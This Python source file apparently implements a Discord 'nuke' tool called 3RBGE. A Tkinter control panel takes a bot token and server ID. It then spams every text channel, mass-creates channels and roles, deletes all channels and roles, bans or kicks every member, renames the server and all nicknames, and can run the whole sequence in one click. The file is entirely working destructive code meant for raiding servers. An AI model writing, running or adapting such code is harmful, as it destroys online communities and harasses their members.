import tkinter as tk
from tkinter import simpledialog, messagebox
import asyncio
import discord
from discord.ext import commands
import threading

class NukeBotApp:
    def __init__(self):
        self.token = ""
        self.guild_id = 0
        self.bot = None
        self.loop = asyncio.new_event_loop()
        self.root = tk.Tk()
        self.root.title("3RBGE Nuke Tool - Login")
        self.root.geometry("400x250")
        self.root.configure(bg="black")
        self.build_login_ui()
        self.root.mainloop()

    def build_login_ui(self):
        tk.Label(self.root, text="3RBGE", font=("Helvetica", 30, "bold"), fg="white", bg="black").pack(pady=10)
        self.token_entry = tk.Entry(self.root, width=40, font=("Arial", 12))
        self.token_entry.insert(0, "Enter Bot Token")
        self.token_entry.pack(pady=10)

        self.guild_entry = tk.Entry(self.root, width=40, font=("Arial", 12))
        self.guild_entry.insert(0, "Enter Server ID")
        self.guild_entry.pack(pady=10)

        start_btn = tk.Button(self.root, text="Start Bot", bg="white", fg="black", bd=0, command=self.start_bot)
        start_btn.pack(pady=15)

    def start_bot(self):
        self.token = self.token_entry.get().strip()
        try:
            self.guild_id = int(self.guild_entry.get().strip())
        except ValueError:
            messagebox.showerror("Error", "Server ID must be a number")
            return

        if not self.token or not self.guild_id:
            messagebox.showerror("Error", "Please enter both token and server ID")
            return

        self.root.destroy()
        threading.Thread(target=self.run_bot_thread, daemon=True).start()
        self.build_main_ui()

    def run_bot_thread(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self.run_bot())

    async def run_bot(self):
        intents = discord.Intents.all()
        self.bot = commands.Bot(command_prefix="!", intents=intents)

        @self.bot.event
        async def on_ready():
            print(f"Logged in as {self.bot.user} (ID: {self.bot.user.id})")
            self.guild = self.bot.get_guild(self.guild_id)
            if not self.guild:
                print("Guild not found.")
                await self.bot.close()
                return
            print(f"Connected to guild: {self.guild.name}")

        await self.bot.start(self.token)

    def build_main_ui(self):
        self.main_root = tk.Tk()
        self.main_root.title("3RBGE Nuke Tool - Control Panel")
        self.main_root.geometry("350x600")
        self.main_root.configure(bg="black")

        tk.Label(self.main_root, text="3RBGE Control Panel", font=("Helvetica", 22, "bold"), fg="white", bg="black").pack(pady=15)

        buttons = [
            ("Spam Messages", self.spam_messages_ui),
            ("Create Channels", self.create_channels_ui),
            ("Delete Channels", self.delete_channels_ui),
            ("Ban All Members", self.ban_all_ui),
            ("Kick All Members", self.kick_all_ui),
            ("Change All Nicknames", self.change_nicknames_ui),
            ("Change Server Name", self.change_server_name_ui),
            ("Create Roles", self.create_roles_ui),
            ("Delete Roles", self.delete_roles_ui),
            ("Run All Tasks", self.run_all_tasks_ui),
        ]

        for (text, func) in buttons:
            btn = tk.Button(self.main_root, text=text, font=("Arial", 14), bg="white", fg="black", bd=0, command=func)
            btn.pack(fill="x", padx=20, pady=7)

        self.main_root.mainloop()

    def spam_messages_ui(self):
        msg = simpledialog.askstring("Spam Messages", "Enter the message to spam:", parent=self.main_root)
        if not msg:
            return
        count = simpledialog.askinteger("Spam Messages", "Enter number of messages:", parent=self.main_root, minvalue=1)
        if not count:
            return
        asyncio.run_coroutine_threadsafe(self.spam_messages(msg, count), self.loop)

    async def spam_messages(self, msg, count):
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            print("Guild not found.")
            return

        async def spam_in_channel(channel):
            for _ in range(count):
                try:
                    await channel.send(msg)
                except:
                    pass

        await asyncio.gather(*(spam_in_channel(c) for c in guild.text_channels))

    def create_channels_ui(self):
        base_name = simpledialog.askstring("Create Channels", "Enter base name for channels:", parent=self.main_root)
        if not base_name:
            return
        count = simpledialog.askinteger("Create Channels", "Enter number of channels:", parent=self.main_root, minvalue=1)
        if not count:
            return
        asyncio.run_coroutine_threadsafe(self.create_channels(base_name, count), self.loop)

    async def create_channels(self, base_name, count):
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return
        await asyncio.gather(*[
            guild.create_text_channel(f"{base_name}-{i+1}")
            for i in range(count)
        ])

    def delete_channels_ui(self):
        if messagebox.askyesno("Delete Channels", "Are you sure you want to delete ALL channels?"):
            asyncio.run_coroutine_threadsafe(self.delete_channels(), self.loop)

    async def delete_channels(self):
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return
        await asyncio.gather(*[
            channel.delete() for channel in guild.channels
        ])

    def ban_all_ui(self):
        if messagebox.askyesno("Ban All", "Ban ALL members (except bots)?"):
            asyncio.run_coroutine_threadsafe(self.ban_all_members(), self.loop)

    async def ban_all_members(self):
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return
        await asyncio.gather(*[
            guild.ban(member, reason="Banned by 3RBGE")
            for member in guild.members if not member.bot
        ])

    def kick_all_ui(self):
        if messagebox.askyesno("Kick All", "Kick ALL members (except bots)?"):
            asyncio.run_coroutine_threadsafe(self.kick_all_members(), self.loop)

    async def kick_all_members(self):
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return
        await asyncio.gather(*[
            guild.kick(member, reason="Kicked by 3RBGE")
            for member in guild.members if not member.bot
        ])

    def change_nicknames_ui(self):
        new_nick = simpledialog.askstring("Change Nicknames", "Enter new nickname:", parent=self.main_root)
        if not new_nick:
            return
        asyncio.run_coroutine_threadsafe(self.change_all_nicknames(new_nick), self.loop)

    async def change_all_nicknames(self, new_nick):
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return
        await asyncio.gather(*[
            member.edit(nick=new_nick)
            for member in guild.members if not member.bot
        ])

    def change_server_name_ui(self):
        new_name = simpledialog.askstring("Change Server Name", "Enter new server name:", parent=self.main_root)
        if not new_name:
            return
        asyncio.run_coroutine_threadsafe(self.change_server_name(new_name), self.loop)

    async def change_server_name(self, new_name):
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return
        await guild.edit(name=new_name)

    def create_roles_ui(self):
        base_name = simpledialog.askstring("Create Roles", "Enter base name for roles:", parent=self.main_root)
        if not base_name:
            return
        count = simpledialog.askinteger("Create Roles", "Enter number of roles:", parent=self.main_root, minvalue=1)
        if not count:
            return
        asyncio.run_coroutine_threadsafe(self.create_roles(base_name, count), self.loop)

    async def create_roles(self, base_name, count):
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return
        await asyncio.gather(*[
            guild.create_role(name=f"{base_name}-{i+1}")
            for i in range(count)
        ])

    def delete_roles_ui(self):
        if messagebox.askyesno("Delete Roles", "Delete ALL roles (except @everyone)?"):
            asyncio.run_coroutine_threadsafe(self.delete_roles(), self.loop)

    async def delete_roles(self):
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return
        await asyncio.gather(*[
            role.delete()
            for role in guild.roles if role.name != "@everyone"
        ])

    def run_all_tasks_ui(self):
        dialog = RunAllDialog(self.main_root, self)
        self.main_root.wait_window(dialog.top)
        if dialog.result:
            asyncio.run_coroutine_threadsafe(self.run_all_tasks(dialog.result), self.loop)

    async def run_all_tasks(self, data):
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return

        await self.delete_channels()
        await self.delete_roles()
        if data.get("server_name"):
            await self.change_server_name(data["server_name"])
        if data.get("channels_name") and data.get("channels_count"):
            await self.create_channels(data["channels_name"], int(data["channels_count"]))
        if data.get("roles_name") and data.get("roles_count"):
            await self.create_roles(data["roles_name"], int(data["roles_count"]))
        if data.get("nicknames_name"):
            await self.change_all_nicknames(data["nicknames_name"])
        await asyncio.sleep(120)
        await self.kick_all_members()

class RunAllDialog:
    def __init__(self, parent, app):
        self.top = tk.Toplevel(parent)
        self.top.title("Run All Tasks Setup")
        self.top.geometry("400x400")
        self.app = app
        self.result = None

        tk.Label(self.top, text="Fill all fields before starting:", font=("Arial", 14, "bold")).pack(pady=10)

        self.entries = {}
        fields = [
            ("Server Name", "server_name"),
            ("Channels Base Name", "channels_name"),
            ("Channels Count", "channels_count"),
            ("Roles Base Name", "roles_name"),
            ("Roles Count", "roles_count"),
            ("Nickname to Set", "nicknames_name"),
        ]
        for (label, key) in fields:
            tk.Label(self.top, text=label).pack(anchor="w", padx=15)
            entry = tk.Entry(self.top)
            entry.pack(fill="x", padx=15, pady=5)
            self.entries[key] = entry

        tk.Button(self.top, text="Start All Tasks", bg="green", fg="white", command=self.on_start).pack(pady=15)

    def on_start(self):
        data = {}
        for key, entry in self.entries.items():
            val = entry.get().strip()
            if not val:
                messagebox.showerror("Error", f"Please fill the field: {key}")
                return
            data[key] = val
        self.result = data
        self.top.destroy()

if __name__ == "__main__":
    app = NukeBotApp()
